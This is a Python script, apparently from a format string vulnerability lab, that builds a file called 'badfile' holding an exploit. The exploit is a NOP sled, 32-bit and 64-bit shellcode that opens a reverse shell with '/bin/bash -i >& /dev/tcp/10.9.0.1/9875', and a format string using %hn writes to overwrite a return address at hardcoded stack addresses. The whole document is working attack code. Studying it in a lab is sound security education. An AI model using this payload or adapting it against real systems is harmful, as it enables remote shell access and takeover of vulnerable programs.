#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1               *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1               *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32

# Put the shellcode somewhere in the payload
start = 1000               # Change this number
content[start:start + len(shellcode)] = shellcode

############################################################
#
#    Construct the format string here

# modify the value (32-bit) at 0xffffd16c to 0xffffd628
# step 1. modify 2 bytes from 0xffffd16e to 0xffff
# step 2. modify 2 bytes from 0xffffd16c to 0xd628
number_high2 = 0xffffd16e
padding      = 0x9add1009
number_low2  = 0xffffd16c
content[0:4]  =  (number_low2).to_bytes(4,byteorder='little')
content[4:8]  =  (padding).to_bytes(4,byteorder='little')
content[8:12] =  (number_high2).to_bytes(4,byteorder='little')

# first: 0xd628-(62*8+3*4)=54316
# second: 0xffff-0xd628=10711
s = "%.8x"*62 + "%.54316x%hn%.10711x%hn"

fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

#
############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
    f.write(content)
